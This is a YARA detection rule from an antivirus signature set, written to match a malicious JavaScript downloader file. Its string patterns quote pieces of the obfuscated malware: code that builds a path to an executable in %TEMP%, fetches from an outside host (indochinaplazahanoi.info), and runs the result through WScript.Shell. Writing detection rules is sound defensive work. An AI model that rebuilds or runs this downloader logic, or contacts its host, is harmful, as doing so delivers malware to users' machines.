rule sig_20160328_6f089eece8d02f2e240a792491808546 {
  meta:
    description = "datamaliciousorder - file 20160328_6f089eece8d02f2e240a792491808546.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "96be7d33740370d5d533f54829aef83a00503f095c056493fa7d6ebaed709c3e"

  strings:
    $s1  = "function Gicbbuk() {return Jlhsq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lPG3JBX7S.exe\";};" fullword ascii
    $s2  = "do {WScript[Fgdvnrlb](Dqphilbc() * 11)} while (Gcgfhoh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Jlhsq = function Bieraagz() {return WScript[Pyskgasaep](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Elhjrg(Ekycrbdv, Rhqvdxxj){return Ekycrbdv - Rhqvdxxj;};" fullword ascii
    $s5  = "Gcgfhoh[Dftqqelt](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Vouqzsi(Pjcyxmiprh){Jlhsq[\"Run\"](Pjcyxmiprh, Xvmxwqh, Xvmxwqh);};" fullword ascii
    $s7  = "function Mnrwhv() {return ((Trvjnovysi == true) && (Trvjnovysi == Krzwgdgiyn)) ? 1 : Xvmxwqh;};" fullword ascii
    $s8  = "var Sgtmncqh = new this[\"Date\"]();" fullword ascii
    $s9  = "Trvjnovysi = true; " fullword ascii
    $s10 = "var Jpxchteiv = false;" fullword ascii
    $s11 = "var Krzwgdgiyn = false;" fullword ascii
    $s12 = "Krzwgdgiyn = true; " fullword ascii
    $s13 = "return Elhjrg(Eftyvc, Xrhsnz);" fullword ascii
    $s14 = "function Yqyeawvcrk(Uzujr) {var Wqrjk = (1, 2, 3, 4, 5, Uzujr); return Wqrjk;};" fullword ascii
    $s15 = "var Trvjnovysi = false;" fullword ascii
    $s16 = "function Dqphilbc(){return 22;};" fullword ascii
    $s17 = " while (Kinhhxy){" fullword ascii
    $s18 = "function Umhjgam(){return Niegynptyk;};" fullword ascii
    $s19 = "function Jboown()" fullword ascii
    $s20 = "function Gzeesvmws(){return Pyskgasaep;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}